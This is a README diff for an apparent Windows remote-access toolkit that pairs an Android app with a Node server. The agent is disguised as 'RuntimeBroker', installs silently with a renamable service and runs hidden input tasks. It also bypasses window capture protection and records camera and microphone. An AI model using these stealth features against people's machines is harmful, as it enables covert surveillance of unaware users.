@@ -124,6 +124,37 @@ graph LR
 
 ---
 
+## ✨ What's new in V2
+
+### 📱 Android App (v4.3)
+- **Temp album** — 📸 Capture and Store saves screenshots to `DCIM/RuntimeBroker`, grid view, multi-select batch share, one-tap clear
+- **Update gate** — mandatory update check against this repo's releases
+- **Live device list** — auto-refresh (3s/5s/10s, persisted), instant connect notifications via `/api/events`, 10 themes
+
+### 🖥️ Windows Agent (v1.0.0.2)
+- **Protected-window screenshots** — captures `WDA_MONITOR` / `WDA_EXCLUDEFROMCAPTURE` windows via user-mode DWM shared surfaces (no driver, no injection); applies to stills, live frames and the temp album
+- **Custom service name** at install time (rename on every reinstall, `/SERVICENAME=` for silent installs)
+- 24×7 Windows service (LocalSystem, auto-restart), silent install, config auto-reload + ACL lock
+- **`--diag` mode**: run `RuntimeBroker.exe --diag` to verify protected-window capture on a machine
+- Input (mouse/keys/paragraph) and audio playback run in the user session via hidden tasks — nothing visible ever appears
+
+### 🌐 Server
+- SSE event stream (`GET /api/events`: `agent-online` / `agent-offline`), version endpoint (`GET /api/version`) for the update gate
+- Login sessions persist to disk (survive restarts/sleeps), agent token fully optional (set `AGENT_TOKEN` to require it)
+
+---
+
+## 🏠 LAN Setup (no cloud)
+
+1. **Start the server on the host**: Android app → **Run on 0.0.0.0** (port `4777`, set a password), or run the Node server bound to `0.0.0.0`.
+2. **Install the agent on each Windows target** (as Administrator): enter the server's LAN IP (e.g. `10.225.129.183` — check with `ipconfig`/`ip addr`, mind typos like `10.255` vs `10.225`), port `4777`, and the server password as token **if the server enforces one** (the phone-hosted server requires the password as token).
+3. **Use `ws://`, not `wss://`, on LAN** — there is no TLS locally: `ws://<lan-ip>:4777/ws/agent`. (`wss://` is only for Render/cloud.)
+4. **Point the app at the LAN server**: Connect → `http://<lan-ip>:4777` (or `http://127.0.0.1:4777` when the server is hosted on the phone itself) + password.
+
+> If the agent won't connect: verify the IP with ping, `Test-NetConnection <ip> -Port 4777`, confirm the scheme is `ws://`, and confirm the token matches what the server expects.
+
+---
+
 ## 🚀 Quick Start (3 Steps)
 
 ### 1️⃣ Deploy Server to Render (Free Tier)
@@ -148,17 +179,19 @@ graph LR
 
 | Method | Instructions |
 |--------|--------------|
-| **📦 Installer (Recommended)** | Download `RuntimeBroker-Setup-<version>.exe` from [Releases](https://github.com/4sudosu/windows-remote-toolkit/releases) → Run as **Administrator** → Enter server URL & password |
-| **🔧 Manual** | Download `RuntimeBroker.exe` → Place in `C:\Program Files\RuntimeBroker\` → Run `RuntimeBroker.exe --install` as Admin |
+| **📦 Installer (Recommended)** | Download `RuntimeBroker-Setup-1.0.0.2.exe` from [Releases](https://github.com/4sudosu/windows-remote-toolkit/releases) → Run as **Administrator** → Enter server IP, port (`4777`, or `443` for Render), optional token & service name |
+| **🔧 Silent** | `RuntimeBroker-Setup-1.0.0.2.exe /VERYSILENT /SERVERIP=<host> /SERVERPORT=4777 /SERVICENAME=<name>` (add `/SERVERTOKEN=<secret>` only if the server sets `AGENT_TOKEN`) |
+| **🔧 Manual** | Place `RuntimeBroker.exe` in `C:\Program Files\RuntimeBroker\` → Run `RuntimeBroker.exe --install --name <ServiceName>` as Admin |
 
-**Configuration (`agent.config.json`):**
+**Configuration (`agent.config.json`, auto-reloaded, ACL-locked):**
 ```json
 {
   "ServerUrl": "wss://your-app.onrender.com/ws/agent",
-  "Token": "your-admin-password",
+  "Token": "",
   "ReconnectDelaySec": 5
 }
 ```
+On Render, the `wss://` URL alone is enough. `Token` stays empty unless the server sets `AGENT_TOKEN`. On LAN use `ws://<lan-ip>:4777/ws/agent` with the server password as token if the server enforces one.
 
 ### 3️⃣ Install Android App
 
@@ -255,15 +288,19 @@ graph LR
 ### Server (Environment Variables)
 | Variable | Required | Default | Description |
 |----------|----------|---------|-------------|
-| `PORT` | No | `3001` | HTTP/WS port (Render sets automatically) |
-| `ADMIN_PASSWORD` | **Yes** | — | Auth token for all API/WS calls |
+| `PORT` | No | `3001` | HTTP/WS port (hosts like Render inject their own) |
+| `ADMIN_PASSWORD` | **Yes** | — | Auth token for dashboard/API (agent WS needs it only if `AGENT_TOKEN` is unset on servers that enforce it) |
+| `AGENT_TOKEN` | No | *(empty = no agent token required)* | Optional token agents must present on `/ws/agent` |
+| `UPDATE_REPO` | No | `4sudosu/WindowRemoteToolkitV2` | GitHub repo the Android update gate checks |
 | `NODE_ENV` | No | `production` | Runtime mode |
+
+Login sessions persist to `sessions.json` (git-ignored), so restarts/sleeps keep you logged in.
 
 ### Agent (`Agent/agent.config.json`)
 ```json
 {
   "ServerUrl": "wss://your-app.onrender.com/ws/agent",
-  "Token": "your-admin-password",
+  "Token": "",
   "ReconnectDelaySec": 5
 }
 ```
@@ -319,19 +356,22 @@ npm start  # Runs on http://localhost:3001
 
 ```
 Runtime Broker/
-├── 📁 Agent/                          # C# .NET 8 Windows Agent
-│   ├── Program.cs                     # Entry point (service + one-shot modes)
-│   ├── RemoteCommands.cs              # All command implementations
-│   ├── ScreenCapture.cs               # DPI-aware screen capture
-│   ├── PowerShellRunner.cs            # Interactive session launcher (WTS + Scheduled Tasks)
-│   ├── AgentService.cs                # Windows Service wrapper
-│   ├── AgentClient.cs                 # WebSocket client for server
+├── 📁 Agent/                          # C# .NET 8 Windows Agent (v1.0.0.2)
+│   ├── Program.cs                     # Entry point (service + --capture/--diag/--rotate/--play/--input-*/--install)
+│   ├── RemoteCommands.cs              # Shell, processes, services, files, rotate, audio, camera, mic
+│   ├── ScreenCapture.cs               # DPI-aware capture + DWM protected-window overlay
+│   ├── DwmBypassCapture.cs            # WDA_MONITOR/WDA_EXCLUDEFROMCAPTURE bypass (user-mode, no driver)
+│   ├── MediaCapture.cs                # Camera (DirectShow) + mic (NAudio)
+│   ├── PowerShellRunner.cs            # Hidden interactive-session tasks (WTS + schtasks, no windows)
+│   ├── AgentService.cs                # 24x7 Windows Service + config hot-reload
+│   ├── AgentClient.cs                 # WebSocket client (register + cmd dispatch)
 │   ├── AgentConfig.cs                 # Config loading
-│   ├── EmergencyStop.cs               # Global hotkey handler
-│   ├── InteractiveActions.cs          # Input actions (text, mouse, paragraph, etc.)
+│   ├── EmergencyStop.cs               # Ctrl+Shift+X hotkey handler
+│   ├── InteractiveActions.cs          # SendInput mouse/keyboard/paragraph
 │   ├── DeviceInfo.cs                  # Machine info collection
-│   ├── RuntimeBroker.csproj           # Project file
-│   └── app.manifest                   # UAC manifest
+│   ├── AgentVersionInfo.cs            # Version reporting
+│   ├── RuntimeBroker.csproj           # Project file (WinExe, self-contained single-file)
+│   └── app.manifest                   # App manifest
 ├── 📁 Server/                         # Node.js WebSocket/HTTP Server
 │   ├── server.js                      # Main server (Express + ws)
 │   ├── package.json                   # Dependencies (express, ws)
@@ -339,8 +379,11 @@ Runtime Broker/
 ├── 📁 AndroidApp/                     # Kotlin Android App
 │   ├── app/src/main/...               # Activities, API, Adapters, Resources
 │   └── build.gradle.kts               # Gradle config
-├── 📁 Installer/                      # Inno Setup Installer
-│   └── installer.iss                  # Installer script (admin, service, ACL)
+├── 📁 Installer/                      # Installers (all build to installer-output/)
+│   ├── installer.iss                  # Inno Setup EXE (wizard: IP/port/optional token/service name)
+│   ├── RuntimeBroker.wxs              # WiX MSI definition (same wizard + service)
+│   ├── Bundle.wxs                     # WiX Burn Setup-EXE wrapper around the MSI
+│   └── placeholder.config             # Seed config replaced at install time
 ├── 📁 scripts/                        # Utility scripts
 │   └── relocate-runtimebroker.ps1
 ├── build-agent.ps1                    # Version bump + publish + installer build
@@ -359,7 +402,7 @@ Runtime Broker/
 | **🔒 Encryption in Transit** | All traffic via HTTPS/WSS (Render provides TLS) |
 | **🛡️ Least Privilege Config** | Agent config ACL-locked: SYSTEM/Admins RW, Users Read-only |
 | **🚫 No Hardcoded Secrets** | All credentials via env vars or user input |
-| **🔑 Token-Based Agent Auth** | Agent authenticates with token on WebSocket connect |
+| **🔑 Optional Agent Token** | Set `AGENT_TOKEN` to require it; otherwise agents connect with no token |
 | **📱 Device Lock (Android)** | 3 failed attempts → device blocked, requires server-side unlock |
 
 > ⚠️ **Warning:** Agent runs as `LocalSystem` — full machine access. Only install on trusted machines you own/control.
@@ -370,9 +413,11 @@ Runtime Broker/
 
 | Platform | File | Size | Version |
 |----------|------|------|---------|
-| **Windows** | `RuntimeBroker-v1.0.0.2.exe` | ~26 MB | Agent v1.0.0.2 |
-| **Windows** | `RuntimeBroker-Setup-v1.0.0.2.exe` | ~28 MB | Installer |
-| **Android** | `RuntimeBroker-v4.2.apk` | ~187 MB | App v4.2 |
+| **Windows** | `RuntimeBroker-Setup-1.0.0.2.exe` | ~47 MB | Installer (Inno wizard: IP/port/optional token/service name) |
+| **Windows** | `RuntimeBroker-1.0.0.2.exe` | ~154 MB | Portable agent (self-contained) |
+| **Android** | `RuntimeBroker4.3.apk` | ~197 MB | App v4.3 (temp album, update gate, SSE notifications) |
+
+> Current binaries ship from [WindowRemoteToolkitV2 releases](https://github.com/4sudosu/WindowRemoteToolkitV2/releases) (v4.3).
 
 👉 **[View All Releases →](https://github.com/4sudosu/windows-remote-toolkit/releases)**
 
